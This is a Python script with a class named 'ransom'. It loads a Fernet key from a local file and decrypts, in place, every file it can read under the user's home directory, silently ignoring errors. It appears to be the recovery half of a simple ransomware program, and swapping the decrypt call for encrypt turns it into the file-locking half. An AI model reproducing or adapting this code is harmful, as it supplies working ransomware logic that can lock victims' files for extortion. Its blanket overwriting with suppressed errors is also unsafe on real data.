from cryptography.fernet import Fernet
import os
from os.path import expanduser

class ransom():
    def __init__(self):
        
        self.key = self.read_key()
        self.decode(self.key)


    def read_key(self):
        return open('key.key', 'rb').read()

    def decode(self,key):
        fer = Fernet(key)
        sys_root = expanduser("~")
        for root, _, files in os.walk(sys_root):
            for f in files:
                try:
                    abs_file_path = os.path.join(root, f)
                    with open(abs_file_path, 'rb') as file:
                        file_data = file.read()
                    encrypted_data = fer.decrypt(file_data)
                    with open(abs_file_path, 'wb') as file:
                        file.write(encrypted_data)

                except:
                    pass




if __name__ == "__main__":

    ransom()